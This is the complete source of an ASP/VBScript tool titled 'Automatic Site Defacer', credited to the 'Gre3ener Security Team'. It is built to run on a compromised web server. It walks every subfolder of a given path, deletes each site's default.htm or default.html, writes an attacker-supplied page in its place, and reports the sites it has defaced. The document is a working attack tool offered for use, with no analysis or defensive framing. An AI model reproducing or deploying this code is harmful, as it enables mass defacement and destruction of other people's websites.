<%@LANGUAGE="VBSCRIPT" CODEPAGE="1252"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%
'-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>
' Automatic Site Defacer Version 1
'  Gre3eNer   Security    Team
' Created By gre3ener ( Cover Of Security - A |3 |3 a S )
'In 2005
'<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-
%>
<%
Dim S
Dim Path
Dim Df
Dim Secret
Dim fso
Dim Report

S = Request.QueryString("S")
Path = Request.form("Path")

Df = Request.form("Df")
If s = 1 Then
Set fso = Server.CreateObject("Scripting.FileSystemObject")
If 	fso.folderexists(path) then
Set ts=fso.GetFolder(Path)

For each SubF in ts.Subfolders

If 	fso.fileexists(Path & "/" &  SubF.Name & "/www/default.htm") then
fso.DeleteFile(Path  & "/" & SubF.Name & "/www/default.htm")
elseif fso.fileexists(Path  & "/" & SubF.Name & "/www/default.html") then
fso.DeleteFile(Path  & "/" & SubF.Name & "/www/default.html")
end if

set objfile = fso.Opentextfile(Df,1)
set objwr = fso.Opentextfile(Path & "/" &  SubF.Name & "/www/default.htm",2,1)

Do while not objfile.atendofstream
objwr.write(objfile.readline)
Loop

Report = Report & SubF.Name & " <br> "

Next


Response.Write "___________<a class=""style1""> YYOOUUUU NOOOOOOW Defacing ALL Site ><><><><>< </a>"
Response.Write "<p class=""style1""> You Deface This Site : </p>"
response.Write"<a class=""style1"">" &  Report &"</a>"
Response.Write "<br>"


ElSe
Response.Write "___________<a class=""style1""> Error Reporting </a>"
Response.Write "<p class=""style1"">" & Path & " ~~> Is Invalid Folder </p>"
Response.Write "<br>"
Response.Write "<br>"
Response.Write "<br>"
End If
End If


set fso = nothing
%>
<html>
<head>
<title>Automatic Site Defacer (By Gre3ener)</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css">
<!--
body {
	background-color: #000000;
}
.style1 {color: #FFFFFF}
.style2 {color: #999999}
.style3 {color: #333333}
-->
</style></head>

<body>
<p class="style1">Autimatic Site Defacer ..............</p>
<p class="style1"><% =server.MapPath("/") %> </p>
<% If Not s = 1 Then %>
<p class="style1">Need Information For Starting Work : </p>
<form name="form1" method="post" action="df.asp?s=1">
<table width="341" height="117" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="137"><span class="style1">Address Of DF File </span></td>
    <td width="192">
      <div align="center">
        <input name="df" type="text" id="df">
      </div></td>
  </tr>
  <tr>
    <td><span class="style1">Address Of Sub Folder </span></td>
    <td><div align="center">
      <input name="path" type="text" id="path">
    </div></td>
  </tr>
  <tr>
    <td><span class="style1">Secret Information </span></td>
    <td><div align="center">
      <input name="secret" type="text" id="secret">
    </div></td>
  </tr>
</table>
 <p>
   <input type="submit" name="Submit" value="Start Defacing.........................................">
 </p>
</form>
<p>
  <% End If %>
</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p align="center"><a href="http://www.gre3ener.com"><span class="style2">Gre3ener Security Team</span></a></p>
<p align="center" class="style3"><a href="ymsgr:sendim?gre3ener">By A |3 |3 a S </a></p>
<p>&nbsp;</p>
<p class="style1">&nbsp;</p>
</body>
</html>